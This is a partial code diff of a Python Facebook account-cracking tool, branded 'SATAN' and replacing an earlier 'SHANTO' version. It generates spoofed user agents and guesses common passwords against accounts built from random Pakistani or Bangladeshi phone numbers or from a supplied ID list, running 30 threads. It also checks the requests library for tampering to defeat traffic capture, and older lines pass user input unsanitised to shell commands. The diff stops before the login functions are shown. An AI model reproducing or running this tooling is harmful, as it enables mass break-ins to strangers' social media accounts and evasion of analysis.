@@ -1,1152 +1,593 @@
-#decode by : JUTTBRAND
-#coding=utf-8
-#created by SHANTO
-#team name hbf
-#tottaly written by hamid Khawaja
-#!/usr/bin/python3
-#---------------------[IMPORT]---------------------#
+#SC OWNER_______________SATAN
+
+from ast import Pass
+from os import name, path
+import os,base64,zlib,pip,urllib
+from weakref import proxy
+import os,base64,zlib,platform
+from urllib.request import parse_http_list
+print('\n [√] Wait Installing Modules...!')
+os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
+print('\n \033[1;32m[√]\033[1;37m Wait Checking Modules...!')
 from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as tred
-import os,sys,time,json,random,re,string,platform,base64,platform,uuid
-import requests,random,sys,json,os,re
-from time import sleep
-from os import system
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
-import os,sys,time,json,random,re,string,platform,base64,uuid
 try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+	from bs4 import BeautifulSoup as bsp
+except:
+	os.system('pip install bs4')
+	from bs4 import BeautifulSoup as bsp
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
 except ModuleNotFoundError:
-    os.system('pip install --upgrade pip && pip install requests futures==2 > /dev/null')
-    os.system('python SHANTO.py')
-class jalan:
-    def __init__(self, z):
-        for e in z + "\n":
-            sys.stdout.write(e)
-            sys.stdout.flush()
-            time.sleep(0.0001)
-sys.stdout.write('\x1b[1;35m\x1b]2; SHANTO \x07')
+        print('\n Installing missing modules ...')
+        os.system('pip install requests futures==2 > /dev/null')
+        os.system('python s1n.py')  
+#============Capture Protection============#
+first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(first+'sessions.py','r').read():
+	pass
+else:
+	exit('\33[1;91mPlease Try This Local Method Capture On Kids ')	 
 
-import requests
-import bs4
-import sys
-import os
-import random
-import time
-import re
-import json
-import uuid
-import subprocess
-import marshal
-import rich
-import shutil
-import webbrowser
-from random import randint
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-from bs4 import BeautifulSoup as par
-from datetime import date
-from datetime import datetime
-# from rich import print as printer
-from datetime import date
-from datetime import date
-from datetime import datetime
-from time import sleep
-from time import sleep as waktu
-import os
-try:
-    import requests
-except(ImportError):
-    os.system("pip install requests")
+cellphone = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
+
+def clr():
+    try:
+        data = os.listdir('/sdcard')
+        if 'Android' in data:
+            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY SATAN');exit()
+        else:exit()
+    except:exit()
+####### MODL KILLER #######
+ 
+from requests import api
+x = open(api.__file__,'r').read()
+if "print" in x:
+    clr()
+elif "sys.stdout.write" in x:
+    clr()
+else:
     pass
-ranasys = ("anaaahilsystems")
-try:
-    import socks
-except(ImportError):
-    os.system("pip install -U requests[socks]")
+from requests import sessions
+ 
+x = open(sessions.__file__,'r').read()
+if "print" in x:
+    clr()
+elif "sys.stdout.write" in x:
+    clr()
+else:
     pass
-try:
-    import bs4
-except(ImportError):
-    os.system("pip install bs4")
+from requests import models
+x = open(models.__file__,'r').read()
+if "print" in x:
+    clr()
+ 
+elif "sys.stdout.write" in x:
+    clr()
+else:
     pass
 
-from bs4 import BeautifulSoup
-import json,os,time,base64,random,re,sys
-from requests.exceptions import ConnectionError as CError
-from concurrent.futures import ThreadPoolExecutor as tpe
+#__________NEW IDX UA_____________#
 
-rug=[]
-for nt in range(10000):
-    rr=random.randint
-    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    rx=random.randrange(1, 999)
-    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}.1.0; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
-    rug.append(xx)
+def S1():
+	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
+	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
+	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
+	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
+	e = ";[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/"+en+";FBRV/209644275;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/"+kt+";FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
+	ua = s + e	
+	return ua
 
-HBF = '{ HBF }'
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today()
-SHANTO2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
-import random
+
+
+#__________BD UA_____________#
+
+ugen=[]
+for xd in range(10000):
+        aa='Mozilla/5.0 (Linux; U; Android'
+        b=random.choice(['6','7','8','9','10','11','12','13'])
+        c=f' TL-tl; {str(cellphone)}'
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+        h=random.randrange(100,114)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36'
+        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
+        ugen.append(uaku2)
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android ;'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+        h=random.randrange(90,114)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/533.1'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt) 
+    
 
 def clear():
-    os.system('clear')
-    print(logo)
-#--------------------COLORS--------------------#
+	os.system('clear')
+	print(logo)
+logo=("""\033[1;37m
+ .d8888.  .d8b.  d888888b  .d8b.  d8b   db 
+ 88'  YP d8' `8b `~~88~~' d8' `8b 888o  88 
+ `8bo.   88ooo88    88    88ooo88 88V8o 88 
+\033[92;1m   `Y8b. 88~~~88    88    88~~~88 88 V8o88 
+ db   8D 88   88    88    88   88 88  V888 
+ `8888Y' YP   YP    YP    YP   YP VP   V8P         
+         \033[1;37m[\033[92;1mSATAN \033[92;1mNAAM \033[92;1mTU \033[92;1mSUNA \033[92;1mHOGA\033[1;37m]
+\033[1;37m-----------------------------------------------
+\033[1;37m AUTHOR    : SATAN \033[92;1m•
+\033[1;37m GITHUB    : NOT FOUND
+\033[1;37m VERSION   : \033[92;1m3\033[92;1m.\033[92;1m4 
+\033[1;37m═══════════════════════════════════════════════
+\033[92;1m            WELCOME TO SATAN TOOL         
+\033[92;1m                 FREE TRAIL \033[1;37m√ 
+\033[1;37m═══════════════════════════════════════════════""")   
 
-A = '\x1b[1;97m' 
-B = '\x1b[1;96m' 
-C = '\x1b[1;91m' 
-D = '\x1b[1;92m'
-M = '\033[1;31m'
-H = '\033[1;32m'
-N = '\x1b[1;37m'
-E = '\x1b[1;93m'
-F = '\x1b[1;94m'
-G = '\x1b[1;95m'
-PURPLE ='\x1b[38;5;46m'
-RED = '\033[1;91m'
-WHITE = '\033[1;97m'
-GREEN = '\033[1;32m'
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-ORANGE = '\033[1;35m'
-BLACK="\033[1;30m"
+def line():
+	print(f'\033[1;37m-----------------------------------------------')
 
-#--------------------LOGO--------------------#
-logo ="""    
-\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
-\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
-\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
-                                                 
-\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m
-\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36mRHS✯TEAM\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
-\033[1;31m \033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mHRIDOY HOSSEN SHANTO            \033[1;31m
-\033[1;31m \033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mSH AN TO             \033[1;31m
-\033[1;31m \033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m SHANTO                  \033[1;31m 
-\033[1;31m \033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mSHANTO WORLD                  \033[1;31m   
-\033[1;31m \033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m0.1                          \033[1;31m   
-\033[1;31m \033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mFACEBOOK TRICKS AND HELPING ZONE\033[1;37m {\033[1;36mHBF\033[1;37m} \033[1;31m
-\033[1;37m╚\033[1;36mⒽⒷⒻ\033[1;37m══════\033[41m\033[1;37m[ 𓆩𝐇𝐈𝐋𝐀𝐑𝐈𝐎𝐔𝐒𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪  𓆩𝐅𝐎𝐑𝐂𝐄𓆪 ]\x1b[0m══════\033[1;36mⒽⒷⒻ\033[1;37m╝
-
-\033[1;31m======================================================"""
-
-
-
-def linex():
-    print(f'{RED}======================================================')
-
-
-
-
-loop = 0
-ok = []
-cp = []
-tf = []
-ua_android = []
-ua_opera = []
-user=[]
-ugen=[]
-ua = ["Davik/2.1.0 (Linux; U; Android 12.0.1; Infinix X676C Build/SP1A.210812.016) [FBAN/FB4A;FBAV/148.0.0.94.498;FBBV/346484979;FBDM/{density=3.0,width=1080,height=2376};FBLC/en_GB;FBRV/47141262;FBCR/Zong;FBMF/INFINIX;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X676C;FBSV/12;FBOP/19;FBCA/arm64-v8a:armeabi-v7a:armeabi;]",]
-ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]",
-ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/438.2.0.32.117;FBBV/530089995;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/533215597]",
-ua = "Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 Instagram 307.0.0.34.111 Android (33/13; 420dpi; 1080x2194; samsung; SM-A336B; a33x; s5e8825; en_US; 532277625)",
-for xd in range(10000):
-	a='Mozilla/5.0 (Symbian/3; Series60/'
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='Nokia'
-	e=random.randrange(1000, 9999)
-	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
-	g=random.randrange(1, 9)
-	h=random.randrange(1, 4)
-	i=random.randrange(1, 4)
-	j=random.randrange(1, 4)
-	k='Mobile Safari/535.1'
-	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen.append(uaku)
-    
-	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X)'
-	b=random.choice(['6','7','8','9','10','11','12'])
-	c=' en-us; GT-'
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile/20F75 Safari/605.1'
-	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	ugen.append(uaku2)
-	
-def exit():
-    os.sys.exit()
-
-
-
-
-def saprate():
-    os.system('clear')
-    print(logo)
-    print('           \x1b[97m[\033[37;41m  L I N K S   M E N U   \033[0;m] ')
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+ck=[]
+#_________Year checker_________#
+def asha(uid):
+    if len(uid)==15:
+        if uid[:10] in ['1000000000']       :alif = ' (*-*) 2009 √'
+        elif uid[:9] in ['100000000']       :alif = ' ACCOUNT  2009 √'
+        elif uid[:8] in ['10000000']        :alif = ' ACCOUNT 2009 √'
+        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 √'
+        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 √'
+        elif uid[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 √'
+        elif uid[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 √'
+        elif uid[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 √'
+        elif uid[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 √'
+        elif uid[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 √'
+        elif uid[:6] in ['100009']          :alif = ' ACCOUNT 2015 √'
+        elif uid[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 √'
+        elif uid[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 √'
+        elif uid[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 √'
+        elif uid[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 √'
+        elif uid[:5] in ['10005']           :alif = ' ACCOUNT 2020 √'
+        elif uid[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 √'
+        elif uid[:5] in ['10008']           :alif = ' ACCOUNT 2022 √'
+        elif uid[:5] in ['10009']           :alif = ' ACCOUNT 2023 √'
+        else:alif=''
+    elif len(uid) in [9,10]:
+        alif = ' ACCOUNT 2008/2009 √'
+    elif len(uid)==8:
+        alif = ' ACCOUNT 2007/2008 √'
+    elif len(uid)==7:
+        alif = ' ACCOUNT 2006/2007 √'
+    else:alif=''
+    return alif
+#_________[ LOGIN KEY ]______>>
+CorrectUsername = 'SATAN'
+key = 'true'
+while key == 'true':
+    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
+    if username == CorrectUsername:
+            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN SATAN TOOL SUCCESSFULLY') 
+            time.sleep(1)
+            clear()
+            key = 'false'
+#_________Cloning Menu_________#
+def menu():
     try:
-        limit = int(input(' HOW MANY LINKS DO YOU WANT TO SPRATE  >: '))
-        print("")
-        print("")
-    except:
-        limit = 1
-    print('           \x1b[97m[\033[37;41m  S A P R A T E   M E N U   \033[0;m] ')
-    print("")
-    print('\033[1;32m PUT YOUR FILE FOR SPRATE')
-    file_name = input('\033[1;33m FILE PATH: ')
-    print("")
-    print(" PUT YOUR NEW FILE NAME ")
-    print('\033[1;32m Example /sdcard/SHANTO-81.txt')
-    new_save = input('\033[1;33m NEW FILE PATH: ')
-    y = 0
-    for k in range(limit):
-        y += 1
-        print("")
-        print("")
-        print('\033[1;32m EXAMPLE [100080],[100081] [100083] ETC  \033[0m')
-        print("")
-        links = input(' \033[1;33mPUT LINKS  %s:\033[1;32m ' % (y))
-        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
-    print(54*"\033[1;33m_")
-    print("")
-    print('\033[1;33m LINKS GRABBED SUCCESSFULLY')
-    print(' TOTAL GRABBED LINKS:\033[1;32m   ' +
-          str(len(open(new_save).read().splitlines())))
-    print('\033[1;33m NEW FILE SAVE AS: \033[1;32m  '+new_save)
-    print(54*"\033[1;33m_")
-    print("")
-    input('\033[1;32m PRESS ENTER TO BACK ')
-    main()
+                clear()        
+                x = ("***")
+                if x == ("***"):
+                        print('[1] CRACK FILE ')
+                        print('[2] RANDOM CRACK')                                    
+                        print('[0] EXIT ')
+                        line()
+                        xd=input(' CHOOSE AN OPTION: ')
+                        
+                        if xd in ['1','01']:
+                                clear()
+                                
+                                print(' PUT FILE EXAMPLE :  /sdcard/file.txt.etc..')
+                                line()
+                                file = input(' PUT FILE PATH\033[1;37m: ')
+                                try:
+                                        fo = open(file,'r').read().splitlines()
+                                except FileNotFoundError:
+                                        print(' FILE LOCATION NOT FOUND ')
+                                        time.sleep(1)
+                                        menu()
+                                clear()
+                                print('[1] M-1 ')
+                                print('[2] M-2 ')
+                                print('[3] M-3 ')
+                                #print('[4] M-4 ')
+                                line()
+                                mthd=input(' CHOOSE : ')
+                                line()
+                                clear()
+                                plist = []
+                                try:
+                                        ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
+                                except:
+                                        ps_limit =1
+                                line()
+                                clear()
+                                print('\033[1;32m EXAMPLE : first last,firtslast,first123')
+                                line()
+                                for i in range(ps_limit):
+                                        plist.append(input(f' PUT PASSWORD {i+1}: '))
+                                line()
+                                clear()
+                                #print(' DO YOU WENT SHOW COOKIES :? (Y/N): ')
+                                #line()
+                                #cx=input(' CHOOSE : ')
+                                #if cx in ['y','Y','yes','Yes','1']:
+                                       # pcp.append('y')
+                                #else:
+                                       # pcp.append('n')
+                                with tred(max_workers=30) as crack_submit:
+                                        clear()
+                                        total_ids = str(len(fo))
+                                        
+                                        print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
+                                        print("\033[1;37m CRACKING....ON\033[1;37m")
+                                        line()
+                                        for user in fo:
+                                                ids,names = user.split('|')
+                                                passlist = plist
+                                                if mthd in ['1','01']:
+                                                        crack_submit.submit(api1,ids,names,passlist)
+                                                elif mthd in ['2','02']:
+                                                        crack_submit.submit(newidx,ids,names,passlist)
+                                                elif mthd in ['3','03']:
+                                                        crack_submit.submit(ffb,ids,names,passlist)
+                                                #elif mthd in ['4','04']:
+                                                       #crack_submit.submit(newidx,ids,names,passlist)        
+                                print('\033[1;37m')
+                                line()
+                                print(' THE PROCESS HAS COMPLETED')
+                                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                                line()
+                                input(' PRESS ENTER TO BACK ')
+                                os.system('python s1n.py')
+                        elif xd in ['2','02']:
+                                clear()
+                                print(' [1] PAKISTAN\n [2] BANGLADESH\n [3] AFGHANISTAN\n [4] INDIA\n [5] GMAIL\n [0] BACK MENU')
+                                line()
+                                x=input(' Choose: ')
+                                if x in ['1','01']:
+                                        pak()
+                                elif x in ['2','02']:
+                                        bd()
+                                elif x in ['3','03']:
+                                        afg()
+                                elif x in ['4','04']:
+                                        ind()        
+                                elif x in ['5','05']:  
+                                        gmail()      
+                                else:
+                                        menu()                                   
+                        elif xd in ['0','00']:
+                                exit()
+                        
+    except requests.exceptions.ConnectionError:
+                print('\n NO INTERNET CONNECTION ...')
+                exit()
+def pak():
+                user=[]
+                clear()
+                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 0300,0315,0333,0345')
+                code = input('\033[1;37m PUT CODE: ')
+                try:
+                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as S1N:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \033[1;97m')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123','janjan','ali123']
+                                S1N.submit(rd,ids,passlist)
+                print('\033[1;37m')
+                line()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                line()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python s1n.py')
+def bd():
+                user=[]
+                clear()
+                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 017, 018, 019, 016, 9196, 9178')
+                code = input('\033[1;37m PUT CODE: ')                                              
+                try:
+                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+                        user.append(nmp)
+                with tred(max_workers=30) as S1N:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \033[1;97m')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,ids[:8],ids[:7],'mimmim','fatema','jannat','sadiya','Bangla','@@@###','304050','102030','203040','708090','i love you','FREE FIRE','free fire','bangladesh','bangla']
+                                S1N.submit(bd1,ids,passlist)
+                print('\033[1;37m')
+                line()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                line()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python s1n.py')
 
-def remove_dub():
-    os.system('clear')
-    print(logo)
-    print('           \x1b[97m[\033[37;41m  DUBBLE LINKS CUTTER MENU   \033[0;m] ')
-    print("[+] EXAMPLE : /sdcard/your_file_name.txt  \n\n")
-    print("")
-    Error = input('[+] FILE PATH   : ')
-    print("")
-    Error1 = input('[+] NEW FILE SAVE AS : ')
-    os.system('touch ' + Error)
-    os.system('sort -r '+Error+' | uniq > '+Error1)
-    print("")
-    print("")
-    print(54*"\033[1;33m_")
-    print("")
-    print("[+] REMOVING DUBBLE LINKS SUCCESSFULLY " + Error)
-    print("[+] NEW FILE SAVE AS : " + Error1)
-    print(54*"\033[1;33m_")
-    print("")
-    input('\033[1;32m PRESS ENTER TO BACK ');main()
-
-
-
-#--------------------MAIN MENU--------------------#
-from time import localtime as lt
-from os import system as cmd
-ltx = int(lt()[3])
-if ltx > 12:
-    xc = ltx-12
-    tag = "PM"
-else:
-    xc = ltx
-    tag = "AM"
-
-
-def main():
-    os.system('clear && rm -rf .txt .t.txt')
-    print(logo)
-    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
-    print(f'{BLUE}══════════════════════════════════════════════════════')
-    print("           \x1b[97m[\033[37;41m  WELCOME. TO SHANTO TOOL \033[0;m] ")
